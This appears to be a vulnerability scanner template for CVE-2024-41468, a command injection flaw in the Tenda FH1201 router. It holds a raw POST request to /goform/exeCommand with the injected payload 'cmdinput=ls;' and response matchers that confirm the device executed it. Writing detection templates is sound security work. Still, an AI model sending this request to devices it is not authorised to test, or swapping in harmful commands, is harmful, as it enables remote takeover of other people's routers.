id: CVE-2024-41468

info:
  name: Tenda FH1201 - Command Injection
  author: Co5mos
  severity: critical
  description: |
    Tenda FH1201 v1.2.0.14 has a command injection vulnerability (CVE-2024-41468). This vulnerability is located in the exeCommand function, where the cmdinput parameter is copied to the stack space v7 without any filtering and then executed. As a result, an attacker can exploit this vulnerability to execute arbitrary commands.
  metadata:
    cve-id: CVE-2024-41468
  tags: tenda, rce, cve, cve2024

http:
  - raw:
      - |
        POST /goform/exeCommand HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        cmdinput=ls;

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, 'bin')
        condition: and
